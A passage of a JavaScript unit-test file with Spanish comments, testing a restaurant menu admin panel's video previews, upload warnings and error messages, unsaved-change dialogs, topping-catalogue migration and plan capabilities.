	test('sin master no se ofrece, aunque el trabajo esté listo', () => {
		// La vuelta se hace reconvirtiendo desde el master. Sin él, el botón
		// fallaría al pulsarlo — y un botón que falla es peor que no tenerlo.
		const m = pintar(true, { id: 'p1' }, pantalla(), listo('horizontal', false));
		assert.equal(m.videoRetirado.style.display, 'none');
	});

	test('un plato que nunca tuvo video no lo ofrece', () => {
		const m = pintar(true, { id: 'p1' }, pantalla(), []);
		assert.equal(m.videoRetirado.style.display, 'none');
	});

	test('los dos avisos no se enseñan a la vez', () => {
		// Son estados excluyentes: "recupéralo" pide que no haya video y
		// "está desfasado" pide que sí. Verlos juntos sería incoherente.
		const conM = pintar(true, conVideo, pantalla(), listo('vertical'));
		assert.equal(conM.videoRetirado.style.display, 'none');
		assert.equal(conM.videoDesfasado.style.display, 'block');

		const sinM = pintar(true, { id: 'p1' }, pantalla(), listo('vertical'));
		assert.equal(sinM.videoRetirado.style.display, 'block');
		assert.equal(sinM.videoDesfasado.style.display, 'none');
	});

	// ── EL VIDEO QUE QUEDÓ EN EL FORMATO ANTERIOR ─────────────
	// Cambiar el modelo de la carta no re-recorta los videos ya convertidos: se
	// quedan como estaban y el restaurante ve una franja del centro creyendo
	// que la conversión salió mal. El master permite arreglarlo sin volver a
	// grabar, pero solo si el panel dice que se puede.
	const conVideo = { id: 'p1', atributos: { video: { url: 'https://ejemplo.test/uploads/videos/a.mp4' } } };
	const listo = (formato, tiene_master = true) => [{
		id: 't1', producto_id: 'p1', estado: 'listo', formato, tiene_master,
		creado_en: '2026-08-26T10:00:00Z',
	}];

	test('un video en el formato de la carta no avisa de nada', () => {
		const m = pintar(true, conVideo, pantalla(), listo('vertical'), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'none');
	});

	test('un video apaisado en una carta vertical ofrece reconvertir', () => {
		const m = pintar(true, conVideo, pantalla(), listo('horizontal'), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'block');
		assert.match(m.videoDesfasadoTexto.textContent, /vertical/);
		assert.equal(m.btnReconvertir.disabled, false);
	});

	test('sin master no se ofrece: no hay de dónde volver a cortar', () => {
		// Ofrecer un botón que va a fallar no le dice a nadie por qué.
		const m = pintar(true, conVideo, pantalla(), listo('horizontal', false), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'none');
	});

	test('sin video publicado tampoco hay nada desfasado', () => {
		const m = pintar(true, { id: 'p1' }, pantalla(), listo('horizontal'), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'none');
	});

	// ── LO QUE GENERÓ EL MODELO ───────────────────────────────
	// Un video generado se convierte igual que cualquier otro, pero el plato
	// no lo enseña hasta que alguien lo mira. Estas tres comprueban que el
	// panel refleja esa diferencia, porque para la cola los dos son 'listo'.
	const generado = {
		id: 'trab-ia', producto_id: 'p1', creado_en: '2026-08-26T10:00:00Z',
		video: 'https://ejemplo.test/uploads/videos/ia.mp4',
		portada: 'https://ejemplo.test/uploads/miniaturas/ia.jpg',
	};

	test('un video generado esperando revisión se enseña con su bloque', () => {
		const m = pintar(true, { id: 'p1' }, pantalla(), [], [generado]);
		assert.equal(m.iaRevision.style.display, 'block');
		assert.equal(m.iaRevisionVideo.src, generado.video);
		assert.equal(m.iaRevisionVideo.poster, generado.portada);
	});

	test('el bloque de revisión convive con el video ya publicado', () => {
		// Un plato puede tener video en la carta Y una animación nueva
		// esperando. Los dos tienen que verse: sin comparar no hay decisión.
		const url = 'https://ejemplo.test/uploads/videos/viejo.mp4';
		const m = pintar(true, { id: 'p1', atributos: { video: { url } } }, pantalla(), [], [generado]);
		assert.equal(m.videoEditPreview.src, url);
		assert.equal(m.iaRevision.style.display, 'block');
	});

	test('el video en revisión no se arrastra al siguiente plato', () => {
		// Mismo fallo que con la previsualización de arriba, y aquí es peor:
		// se aprobaría para un plato el video generado de otro.
		const m = pantalla();
		pintar(true, { id: 'p1' }, m, [], [generado]);
		pintar(true, { id: 'p2' }, m, [], [generado]);
		assert.equal(m.iaRevision.style.display, 'none');
		assert.equal(m.iaRevisionVideo.src, undefined);
	});

	test('un plato sin video no arrastra el del anterior', () => {
		// El elemento <video> es el mismo para todos los platos: si no se le
		// quita el src, abrir un plato sin video enseña el del que se miró antes.
		const m = pantalla();
		pintar(true, { id: 'p1', atributos: { video: { url: 'https://ejemplo.test/a.mp4' } } }, m);
		pintar(true, { id: 'p2' }, m);
		assert.equal(m.videoEditPreview.src, undefined, 'debe soltar el src del plato anterior');
		assert.equal(m.videoEditPreview.style.display, 'none');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiSePasaElVideo · el trozo elegido tiene que caber', () => {
	// Se guardan 8 segundos desde el punto que marque el restaurante. Si
	// elige uno donde ya no quedan 8, el video sale más corto — y eso se
	// sabe antes de subir nada, no después de esperar minuto y medio a que
	// ffmpeg termine.
	const conVideo = (duracion, desde) => {
		const mapa = {
			videoEditPreview:  { duration: duracion },
			videoDesde:        { value: String(desde) },
			videoDesdeAviso:   { textContent: 'sucio', style: {} },
			btnConfirmarVideo: { disabled: false, style: {} },
		};
		const ctx = cargar('index.html', 'const DURACION_MIN_VIDEO',
			'async function confirmarSubidaVideo',
			{ document: { getElementById: id => mapa[id] } });
		ctx.avisarSiSePasaElVideo();
		return { aviso: mapa.videoDesdeAviso.textContent, bloqueado: mapa.btnConfirmarVideo.disabled };
	};

	test('con hueco de sobra no dice nada', () => {
		assert.equal(conVideo(30, 5).aviso, '', 'quedan 25 s, no hay nada que avisar');
	});

	test('justo en el límite tampoco', () => {
		assert.equal(conVideo(30, 22).aviso, '', 'quedan exactamente 8 s');
	});

	test('avisa cuando el trozo se queda corto', () => {
		assert.match(conVideo(30, 26).aviso, /4\.0 s/, 'quedan 4 s y hay que decirlo');
	});

	test('no muestra segundos negativos si se pasa del final', () => {
		// Escribir 40 en un video de 30 daba "-10.0 s", que no significa nada.
		assert.match(conVideo(30, 40).aviso, /0\.0 s/);
	});

	test('sin metadatos todavía no aventura nada', () => {
		// La duración no se conoce hasta loadedmetadata; hasta entonces es NaN
		// y un aviso calculado con eso sería basura.
		assert.equal(conVideo(NaN, 5).aviso, '');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiSePasaElVideo · lo demasiado corto no se sube', () => {
	// Idea del propio usuario, y es mejor que convertirlo igual: un bucle de
	// un segundo en una carta marea. Más vale decirlo antes de que suban
	// treinta megas para nada.
	const conVideo = (duracion, desde) => {
		const mapa = {
			videoEditPreview:  { duration: duracion },
			videoDesde:        { value: String(desde) },
			videoDesdeAviso:   { textContent: '', style: {} },
			btnConfirmarVideo: { disabled: false, style: {} },
		};
		const ctx = cargar('index.html', 'const DURACION_MIN_VIDEO',
			'async function confirmarSubidaVideo',
			{ document: { getElementById: id => mapa[id] } });
		ctx.avisarSiSePasaElVideo();
		return { aviso: mapa.videoDesdeAviso.textContent, bloqueado: mapa.btnConfirmarVideo.disabled };
	};

	test('un video de un segundo no deja subir', () => {
		const r = conVideo(1, 0);
		assert.equal(r.bloqueado, true);
		assert.match(r.aviso, /al menos 3/);
	});

	test('justo en el mínimo sí deja', () => {
		assert.equal(conVideo(3, 0).bloqueado, false, '3 s exactos son válidos');
	});

	test('un video largo con el punto casi al final tampoco deja', () => {
		// Lo que importa no es cuánto dura el original sino cuánto queda desde
		// donde empieza el recorte.
		assert.equal(conVideo(40, 38).bloqueado, true, 'quedan 2 s de 40');
		assert.equal(conVideo(40, 30).bloqueado, false, 'quedan 10 s');
	});

	test('volver a un punto válido vuelve a permitir', () => {
		// El botón se deshabilita, y si no se rehabilitara al corregir el
		// número el usuario se quedaría encerrado sin saber por qué.
		assert.equal(conVideo(20, 19).bloqueado, true);
		assert.equal(conVideo(20, 5).bloqueado, false);
	});

	test('sin metadatos no se bloquea nada', () => {
		// La duración llega con loadedmetadata. Bloquear antes dejaría el botón
		// muerto en los milisegundos previos y parecería roto.
		assert.equal(conVideo(NaN, 0).bloqueado, false);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('cambios sin guardar · la ficha no se cierra en silencio', () => {
	// Un clic fuera del modal lo cerraba y se llevaba lo escrito. Se compara
	// una firma del formulario en vez de levantar una bandera al primer
	// tecleo: escribir algo y borrarlo no debe contar como cambio, porque
	// preguntar cuando no hay nada que perder enseña a decir que sí sin leer.
	const montar = ({ videoElegido = null, subiendoVideo = false, enCurso = null } = {}) => {
		const mapa = {
			editNombre:       { value: 'Croquetas' },
			editCategoria:    { value: 'cat-1' },
			editPrecioNum:    { value: '24000' },
			editDesc:         { value: '' },
			editDescAvanzada: { value: '' },
			editDisponible:   { checked: true },
			editProductId:    { value: 'p1' },
			procesoTexto:     { textContent: '' },
		};
		const abiertos = [], cerrados = [];
		const ctx = cargar('index.html', 'function firmaProducto', 'async function saveProduct', {
			state: { pendingImgUrl: null, extraImgs: [], prodFiltros: [], prodBadges: {}, subiendoVideo },
			videoElegido,
			document: { getElementById: id => mapa[id] },
			openModal:  id => abiertos.push(id),
			closeModal: id => cerrados.push(id),
			trabajoEnCursoDe: () => enCurso,
		});
		return { ctx, mapa, abiertos, cerrados };
	};

	test('sin tocar nada, no hay cambios', () => {
		const { ctx } = montar();
		ctx.fijarFirmaProducto();
		assert.equal(ctx.productoTieneCambios(), false);
	});

	test('cambiar un campo cuenta como cambio', () => {
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Croquetas de jamón';
		assert.equal(ctx.productoTieneCambios(), true);
	});

	test('escribir y deshacer NO cuenta como cambio', () => {
		// Lo que evita el aviso inútil que la gente aprende a ignorar.
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editPrecioNum.value = '99000';
		assert.equal(ctx.productoTieneCambios(), true, 'mientras está cambiado, sí');
		mapa.editPrecioNum.value = '24000';
		assert.equal(ctx.productoTieneCambios(), false, 'al volver al valor original, no');
	});

	test('el interruptor de disponible también cuenta', () => {
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editDisponible.checked = false;
		assert.equal(ctx.productoTieneCambios(), true);
	});

	test('un video elegido y sin subir es trabajo por perder', () => {
		// Hay que volver a buscar el archivo y a marcar el segundo de inicio.
		const { ctx } = montar({ videoElegido: { name: 'plato.mp4' } });
		ctx.fijarFirmaProducto();
		assert.equal(ctx.productoTieneCambios(), false, 'si ya estaba al abrir, no es un cambio');

		const otra = montar();
		otra.ctx.fijarFirmaProducto();
		// Simular que se elige un archivo después de abrir la ficha.
		otra.ctx.videoElegido = { name: 'plato.mp4' };
		assert.equal(otra.ctx.productoTieneCambios(), true);
	});

	test('sin cambios, cerrar cierra directo', () => {
		const { ctx, abiertos, cerrados } = montar();
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();
		assert.deepEqual(cerrados, ['productModal']);
		assert.deepEqual(abiertos, [], 'no hay por qué preguntar nada');
	});

	test('con cambios, cerrar pregunta antes', () => {
		const { ctx, mapa, abiertos, cerrados } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Otra cosa';
		ctx.intentarCerrarProducto();
		assert.deepEqual(abiertos, ['cambiosModal']);
		assert.deepEqual(cerrados, [], 'la ficha sigue abierta hasta que decida');
	});

	// ── UN VIDEO A MEDIAS NO SON CAMBIOS SIN GUARDAR ──────────
	// Salía ese aviso, porque el archivo elegido cuenta en la firma. Y su
	// texto —"si sales ahora se pierden"— dice lo contrario de lo que pasa:
	// ni la subida ni la conversión se cortan al cerrar. Quien lo leía se
	// quedaba esperando por miedo a perder algo que no se perdía.
	//
	// Es su propia ventana y no el confirm() del navegador: el panel ya tiene
	// un patrón para "vas a salir de algo" y meter un diálogo del sistema en
	// medio lo rompe, en el móvil sobre todo. Y es una ventana APARTE de la de
	// cambios sin guardar porque dice lo contrario que aquella; usar la misma
	// para las dos cosas enseñaría a no leerla.

	test('subiendo, sale la ventana del proceso y no la de cambios', () => {
		const { ctx, mapa, abiertos } = montar({ subiendoVideo: true, videoElegido: { name: 'a.mp4' } });
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.deepEqual(abiertos, ['procesoModal'], 'la de cambios diría algo falso aquí');
		assert.match(mapa.procesoTexto.textContent, /subiendo un video/);
		assert.match(mapa.procesoTexto.textContent, /sigue en segundo plano/);
	});

	test('convirtiendo también, aunque no haya nada en el formulario', () => {
		// Este era el hueco: la subida al menos ensuciaba la firma y disparaba
		// el aviso equivocado. La conversión no dejaba rastro y la ficha se
		// cerraba en silencio.
		const { ctx, mapa, abiertos } = montar({ enCurso: { id: 't1' } });
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.deepEqual(abiertos, ['procesoModal']);
		assert.match(mapa.procesoTexto.textContent, /convirtiendo/);
	});

	test('mientras la ventana está abierta, la ficha no se cierra', () => {
		const { ctx, cerrados } = montar({ subiendoVideo: true });
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.deepEqual(cerrados, [], 'se cierra al elegir, no antes');
	});

	test('"Cerrar de todos modos" cierra las dos ventanas', () => {
		// No se bloquea la salida: un video de 66 MB tarda minutos y la
		// conversión otro par. El proceso no necesita que esté delante.
		const { ctx, cerrados } = montar({ subiendoVideo: true });
		ctx.fijarFirmaProducto();
		ctx.salirConProcesoEnMarcha();

		assert.deepEqual(cerrados, ['procesoModal', 'productModal']);
	});

	test('el proceso manda sobre los cambios del formulario', () => {
		// Con las dos cosas a la vez solo se puede enseñar una ventana, y la
		// que importa es la que el usuario no se espera.
		const { ctx, mapa, abiertos } = montar({ subiendoVideo: true });
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Otra cosa';
		ctx.intentarCerrarProducto();

		assert.deepEqual(abiertos, ['procesoModal']);
	});

	test('sin proceso en marcha, todo sigue como antes', () => {
		// La guarda de typeof no puede acabar disparando la ventana siempre.
		const { ctx, abiertos, cerrados } = montar();
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.deepEqual(abiertos, []);
		assert.deepEqual(cerrados, ['productModal']);
	});

	test('salir sin guardar cierra las dos ventanas', () => {
		const { ctx, mapa, cerrados } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Otra cosa';
		ctx.salirSinGuardar();
		assert.deepEqual(cerrados, ['cambiosModal', 'productModal']);
	});

	test('sin firma fijada no molesta', () => {
		// Estado de arranque, antes de abrir ninguna ficha: no hay nada que
		// comparar y no se puede inventar un cambio.
		const { ctx } = montar();
		assert.equal(ctx.productoTieneCambios(), false);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('ajustarFichaAlModelo · cada modelo enseña lo suyo', () => {
	// La misma ficha sirve para todos los modelos. Un control que no hace
	// nada es peor que no tenerlo: quien lo usa cree que está trabajando.
	const conModelo = nav => {
		const mapa = {
			extraImgsGroup:   { style: {} },
			labelImagen:      { innerHTML: '' },
			labelVideo:       { innerHTML: '' },
			videoEditPreview: { style: {} },
		};
		// Dos trozos: la lista de modelos que pintan video y la función que
		// la consulta. Se cargan los dos del fuente en vez de escribir la
		// lista aquí, para que añadir un encuadre nuevo al panel y olvidarse
		// de esta prueba no dé un falso verde.
		const ctx = cargar('index.html', [
			['// ── MODELOS QUE PINTAN VIDEO', 'function idPlanActual'],
			['function ajustarFichaAlModelo', '// ── CAMBIOS SIN GUARDAR'],
		], {
			state: { restaurante: { atributos: { nav } } },
			document: { getElementById: id => mapa[id] },
		});
		ctx.ajustarFichaAlModelo();
		return mapa;
	};

	test('los modelos de video esconden las imágenes adicionales', () => {
		// Ni temas/video.js ni temas/vertical.js leen atributos.imagenes en
		// ninguna parte: subirlas ahí es subirlas para nadie.
		for (const nav of ['video', 'vertical'])
			assert.equal(conModelo(nav).extraImgsGroup.style.display, 'none', `en ${nav}`);
	});

	test('los demás modelos las siguen enseñando', () => {
		for (const nav of ['topnav', 'sidebar', 'carrito', 'explorar'])
			assert.equal(conModelo(nav).extraImgsGroup.style.display, '', `en ${nav}`);
	});

	test('en los modelos de video, la foto se explica como respaldo', () => {
		// Deja de ser lo que se ve y pasa a ser lo que se ve mientras no haya
		// video. Eso hay que decirlo donde se mira, no en un manual.
		for (const nav of ['video', 'vertical'])
			assert.match(conModelo(nav).labelImagen.innerHTML, /mientras el plato no tenga video/, `en ${nav}`);
	});

	test('en los demás la etiqueta se queda limpia', () => {
		assert.equal(conModelo('topnav').labelImagen.innerHTML, 'Imagen');
	});

	test('un restaurante sin modelo declarado no se rompe', () => {
		// atributos.nav vacío es 'topnav' por defecto en el menú público.
		const mapa = conModelo(undefined);
		assert.equal(mapa.extraImgsGroup.style.display, '');
		assert.equal(mapa.labelImagen.innerHTML, 'Imagen');
	});

	test('la proporción prometida es la que el worker va a cortar', () => {
		// El servidor deriva el formato del modelo: 'vertical' pide 720x1280 y
		// todo lo demás 1280x720. Si la ficha dijera 16:9 a un restaurante
		// vertical, estaría prometiendo un recorte que no se va a hacer.
		assert.match(conModelo('vertical').labelVideo.innerHTML, /9:16/);
		for (const nav of ['video', 'topnav', 'carrito', undefined])
			assert.match(conModelo(nav).labelVideo.innerHTML, /16:9/, `en ${nav}`);
	});

	test('la previsualización tiene el hueco del formato que se guarda', () => {
		// Con el hueco apaisado clavado, un 9:16 entra recortado por object-fit
		// y enseña una franja del centro: parece que la conversión salió mal
		// cuando salió bien.
		assert.equal(conModelo('vertical').videoEditPreview.style.aspectRatio, '9 / 16');
		assert.equal(conModelo('video').videoEditPreview.style.aspectRatio, '16 / 9');
		assert.equal(conModelo('topnav').videoEditPreview.style.aspectRatio, '16 / 9');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('mensajeDeSubida · qué se lee cuando falla un video', () => {
	// Un video son decenas de megas por una conexión doméstica. El panel
	// enseñaba "Error" a secas para todas las formas de fallar ahí, y con eso
	// no se puede diagnosticar nada: pasó de verdad con el Tartar de Indigo y
	// hubo que reconstruirlo desde los registros de Supabase.
	const { mensajeDeSubida } = cargar('index.html',
		'function mensajeDeSubida', 'function enviarVideo', {});

	test('cortarse a medias dice por dónde iba', () => {
		// El porcentaje es lo que separa "es tu conexión" de "es el servidor".
		assert.match(mensajeDeSubida({ tipo: 'red', porcentaje: 8.4 }),  /8%/);
		assert.match(mensajeDeSubida({ tipo: 'red', porcentaje: 61.7 }), /62%/);
		assert.match(mensajeDeSubida({ tipo: 'red', porcentaje: 61.7 }), /no llegó entero/);
	});

	test('subido entero y sin respuesta NO invita a reintentar', () => {
		// Aquí el trabajo puede estar ya encolado. Decir "vuelve a intentarlo"
		// es pedir el mismo video dos veces y dejar uno huérfano en el disco.
		const m = mensajeDeSubida({ tipo: 'red', porcentaje: 100 });
		assert.match(m, /se subió entero/);
		assert.ok(!/vuelve a intentarlo/i.test(m), 'no debe empujar a reintentar');
	});

	test('lo que explique el servidor manda sobre cualquier texto nuestro', () => {
		// "El archivo pasa del límite de 200 MB" y "Solo MP4 o MOV" están
		// escritos para leerse; taparlos con un genérico sería peor.
		assert.equal(
			mensajeDeSubida({ tipo: 'http', estado: 400, error: 'Solo MP4 o MOV' }),
			'Solo MP4 o MOV');
		assert.equal(
			mensajeDeSubida({ tipo: 'http', estado: 507, error: 'No hay espacio suficiente en el servidor' }),
			'No hay espacio suficiente en el servidor');
	});

	test('un estado sin cuerpo legible no se queda en "Error"', () => {
		// Es exactamente el caso que no supimos leer: algo por delante del
		// servidor contesta su propia página HTML y el panel no la entiende.
		assert.match(mensajeDeSubida({ tipo: 'http', estado: 413 }), /413/);
		assert.match(mensajeDeSubida({ tipo: 'http', estado: 413 }), /tamaño/);
		for (const estado of [502, 503, 504])
			assert.match(mensajeDeSubida({ tipo: 'http', estado }), new RegExp(String(estado)));
		assert.match(mensajeDeSubida({ tipo: 'http', estado: 418 }), /418/);
	});

	test('ningún camino devuelve vacío ni la palabra "Error" a secas', () => {
		const casos = [
			{ tipo: 'red', porcentaje: 0 }, { tipo: 'red', porcentaje: 100 },
			{ tipo: 'http', estado: 400 }, { tipo: 'http', estado: 413 },
			{ tipo: 'http', estado: 500 }, { tipo: 'http', estado: 504 },
			{ tipo: 'http', estado: 0 },
		];
		for (const c of casos) {
			const m = mensajeDeSubida(c);
			assert.ok(m && m.length > 20, `mensaje pobre en ${JSON.stringify(c)}: ${m}`);
			assert.notEqual(m, 'Error');
		}
	});
});

// ═══════════════════════════════════════════════════════════════
describe('trabajoEnCursoDe · una conversión en marcha se ve al reabrir', () => {
	// La vigilancia sobrevive a cerrar la ficha, pero no a recargar la página.
	// Sin esto, el plato vuelve a decir "Sin video" mientras el worker todavía
	// lo tiene, y lo natural es subirlo otra vez: dos videos buenos para el
	// mismo plato y un original huérfano ocupando disco.
	const conTrabajos = trabajos => {
		const ctx = cargar('index.html', 'function trabajoFallidoDe', 'async function descartarVideoFallido',
			{ state: { trabajosVideo: trabajos } });
		return ctx;
	};

	const t = (id, producto_id, estado, creado_en) => ({ id, producto_id, estado, creado_en });

	test('encuentra el que espera turno y el que ya está en ffmpeg', () => {
		// Para quien mira la ficha son lo mismo: su video no está todavía.
		for (const estado of ['pendiente', 'procesando']) {
			const ctx = conTrabajos([t('t1', 'p1', estado, '2026-08-20T10:00:00Z')]);
			assert.equal(ctx.trabajoEnCursoDe('p1')?.id, 't1', `con estado ${estado}`);
		}
	});

	test('lo terminado no cuenta como en marcha', () => {
		// Si 'listo' contara, el botón de subir se quedaría apagado para
		// siempre en cuanto el plato tuviera un video.
		for (const estado of ['listo', 'error']) {
			const ctx = conTrabajos([t('t1', 'p1', estado, '2026-08-20T10:00:00Z')]);
			assert.equal(ctx.trabajoEnCursoDe('p1'), null, `con estado ${estado}`);
		}
	});

	test('no se cruzan los platos', () => {
		const ctx = conTrabajos([t('t1', 'otro', 'procesando', '2026-08-20T10:00:00Z')]);
		assert.equal(ctx.trabajoEnCursoDe('p1'), null);
	});

	test('con varios, el más reciente', () => {
		const ctx = conTrabajos([
			t('viejo', 'p1', 'pendiente',  '2026-08-20T10:00:00Z'),
			t('nuevo', 'p1', 'procesando', '2026-08-20T11:00:00Z'),
		]);
		assert.equal(ctx.trabajoEnCursoDe('p1').id, 'nuevo');
	});

	test('sin trabajos cargados no revienta', () => {
		// planActual().videos falso deja state.trabajosVideo en [], y un fallo
		// de red lo deja igual: la ficha tiene que abrirse de todas formas.
		for (const v of [[], undefined, null])
			assert.equal(conTrabajos(v).trabajoEnCursoDe('p1'), null, `con ${JSON.stringify(v)}`);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('catalogoDe · el catálogo de toppings, en una sola forma', () => {
	// Espejo de catalogoDe() en core/carrito.js del menú público. El catálogo
	// se ha guardado de tres maneras: cadenas sueltas, objeto con precio y
	// objeto con identificador. Las tres tienen que dar lo mismo, o el panel y
	// la carta enseñarían cosas distintas.
	const crudo = () => cargar('index.html', 'function catalogoDe',
		'// ── PERSONALIZACIÓN DEL PLATO', {}).catalogoDe;
	// El vm corre en otro realm: lo que crea allí no comparte prototipos con lo
	// de aquí y deepEqual estricto lo rechaza aunque la forma coincida.
	const normalizar = attr => JSON.parse(JSON.stringify(crudo()(attr)));

	test('una cadena suelta usa su nombre como identificador', () => {
		// Es la pieza que sostiene la migración: sin ella, un plato guardado con
		// nombres y un catálogo ya migrado no se encontrarían nunca.
		const c = normalizar({ toppings_platino: ['Queso'], salsas: ['BBQ'] });
		assert.deepEqual(c.platino, [{ id: 'Queso', nombre: 'Queso' }]);
		assert.deepEqual(c.salsas,  [{ id: 'BBQ', nombre: 'BBQ' }]);
	});

	test('con identificador, manda el identificador', () => {
		const c = normalizar({ toppings_premium: [{ id: 'top_1', nombre: 'Tocineta', precio: 4000 }] });
		assert.deepEqual(c.premium, [{ id: 'top_1', nombre: 'Tocineta', precio: 4000 }]);
	});

	test('un premium sin precio vale cero, no NaN', () => {
		assert.equal(normalizar({ toppings_premium: [{ nombre: 'X', precio: 'abc' }] }).premium[0].precio, 0);
	});

	test('la basura se cae en vez de pintarse', () => {
		// atributos es JSON libre: lo que entre raro no puede acabar como un
		// chip vacío en la pestaña.
		const c = normalizar({ toppings_platino: ['', null, '  ', 'Queso'], salsas: 'no soy lista' });
		assert.deepEqual(c.platino.map(t => t.nombre), ['Queso']);
		assert.deepEqual(c.salsas, []);
	});

	test('sin catálogo devuelve las tres listas vacías', () => {
		assert.deepEqual(normalizar({}),   { platino: [], premium: [], salsas: [] });
		assert.deepEqual(normalizar(null), { platino: [], premium: [], salsas: [] });
	});
});

// ═══════════════════════════════════════════════════════════════
describe('personalizacionDe · qué toppings ofrece un plato', () => {
	// Devuelve siempre IDENTIFICADORES del catálogo de hoy, venga el plato de
	// la época que venga. Traducir aquí es lo que migra los datos solos: en
	// cuanto el restaurante guarde la ficha, lo que se escribe ya son ids.
	const ctx = () => cargar('index.html', [
		['function catalogoDe', '// ── PERSONALIZACIÓN DEL PLATO'],
		['function personalizacionDe', 'function renderPersonalizacion'],
	], {});
	const traducir = (p, attr) => {
		const c = ctx();
		return JSON.parse(JSON.stringify(c.personalizacionDe(p, c.catalogoDe(attr))));
	};

	const CATALOGO = {
		toppings_platino: [{ id: 't_ceb', nombre: 'Cebolla' }, { id: 't_tom', nombre: 'Tomate' }],
		toppings_premium: [{ id: 't_toc', nombre: 'Tocineta', precio: 4000 }],
		salsas:           [{ id: 't_bbq', nombre: 'BBQ' }],
	};

	test('un plato ya migrado se lee tal cual', () => {
		assert.deepEqual(traducir({ atributos: { personalizacion: {
			platino: ['t_ceb'], premium: ['t_toc'], salsas: ['t_bbq'],
		} } }, CATALOGO), { platino: ['t_ceb'], premium: ['t_toc'], salsas: ['t_bbq'] });
	});

	test('un plato guardado con NOMBRES se traduce a identificadores', () => {
		// La ventana de la migración: el catálogo ya tiene ids y el plato
		// todavía no. Se encuentran igual, y al guardar la ficha queda migrado.
		assert.deepEqual(traducir({ atributos: { personalizacion: {
			platino: ['Cebolla'], premium: ['Tocineta'], salsas: ['BBQ'],
		} } }, CATALOGO), { platino: ['t_ceb'], premium: ['t_toc'], salsas: ['t_bbq'] });
	});

	test('RENOMBRAR un topping ya no desengancha el plato', () => {
		// El motivo entero de que exista el identificador.
		const renombrado = { ...CATALOGO, toppings_platino: [{ id: 't_ceb', nombre: 'Cebolla caramelizada' }] };
		assert.deepEqual(traducir({ atributos: { personalizacion: { platino: ['t_ceb'] } } }, renombrado).platino,
			['t_ceb'], 'sigue marcado');
	});

	test('lo que ya no está en el catálogo se cae', () => {
		const r = traducir({ atributos: { personalizacion: { platino: ['t_ceb', 't_borrado'] } } }, CATALOGO);
		assert.deepEqual(r.platino, ['t_ceb']);
	});

	test('de la copia vieja se sale por el nombre', () => {
		// Los tres productos originales llevaban una copia del catálogo dentro.
		// El precio deja de viajar con el plato: pasa a salir siempre del
		// catálogo del negocio, que es lo que arregla el fallo.
		const r = traducir({ atributos: {
			toppings_platino: ['Cebolla', 'Tomate'],
			toppings_premium: [{ nombre: 'Tocineta', precio: 9000 }],
			salsas: ['BBQ'],
		} }, CATALOGO);
		assert.deepEqual(r.platino, ['t_ceb', 't_tom']);
		assert.deepEqual(r.premium, ['t_toc'], 'sin el precio dentro');
		assert.deepEqual(r.salsas,  ['t_bbq']);
	});

	test('un plato nuevo empieza vacío', () => {
		assert.deepEqual(traducir({ atributos: {} }, CATALOGO),
			{ platino: [], premium: [], salsas: [] });
	});

	test('no se queda con referencias a los arreglos del producto', () => {
		// Si compartiera el arreglo, marcar un chip modificaría el producto en
		// memoria y "cambios sin guardar" no vería nada que comparar.
		const c = ctx();
		const p = { atributos: { personalizacion: { platino: ['t_ceb'], premium: [], salsas: [] } } };
		c.personalizacionDe(p, c.catalogoDe(CATALOGO)).platino.push('t_tom');
		assert.deepEqual(p.atributos.personalizacion.platino, ['t_ceb'], 'el producto no se toca');
	});

	test('una copia vieja con entradas rotas no las arrastra', () => {
		const r = traducir({ atributos: {
			toppings_premium: [{ nombre: 'Tocineta', precio: 4000 }, { precio: 1000 }, null],
		} }, CATALOGO);
		assert.deepEqual(r.premium, ['t_toc']);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('tabla de planes del panel', () => {
	// Es un espejo de core/planes.js del menú público: dos aplicaciones
	// desplegadas por separado que deben decir lo mismo. Si divergen, el
	// panel ofrece algo que la carta no pinta, o al revés.
	//
	// Se entra por planDe y no por PLANES a propósito: un 'const' no se
	// engancha al contexto del vm —solo las declaraciones de función—, y de
	// paso se prueba el accesor que usa el panel de verdad.
	const { planDe } = cargar('index.html', 'const PLANES = {', 'function planActual');
	const PLANES_NOMBRES = ['vitrina', 'pedidos', 'completo', 'video'];
	const plan = nombre => planDe({ atributos: { plan: nombre } });

	test('todos los planes declaran todas las capacidades', () => {
		// Una bandera que falta se lee como undefined, o sea como "no", y un
		// plan pierde algo sin que nadie lo haya decidido.
		const banderas = ['marca', 'qr_disenador', 'estadisticas', 'horarios', 'videos', 'carrito'];
		for (const nombre of PLANES_NOMBRES)
			for (const b of banderas)
				assert.equal(typeof plan(nombre)[b], 'boolean', `${nombre} no declara "${b}"`);
	});

	test('el carrito es capacidad de plan, no solo modelo de página', () => {
		assert.equal(plan('vitrina').carrito, false, 'vitrina es solo escaparate');
		assert.equal(plan('pedidos').carrito, true);
		assert.equal(plan('completo').carrito, true);
		assert.equal(plan('video').carrito, true);
	});

	test('el modelo de video solo lo lista el plan de video', () => {
		for (const n of ['vitrina', 'pedidos', 'completo'])
			assert.equal(plan(n).modelos.includes('video'), false, `${n} no debería`);
		assert.ok(plan('video').modelos.includes('video'));
	});

	test('un plan desconocido no deja al restaurante sin nada', () => {
		// Un valor mal escrito en la base no puede apagarle el panel a nadie.
		assert.equal(typeof plan('platino_ultra').carrito, 'boolean');
	});
});

// ═══════════════════════════════════════════════════════════════
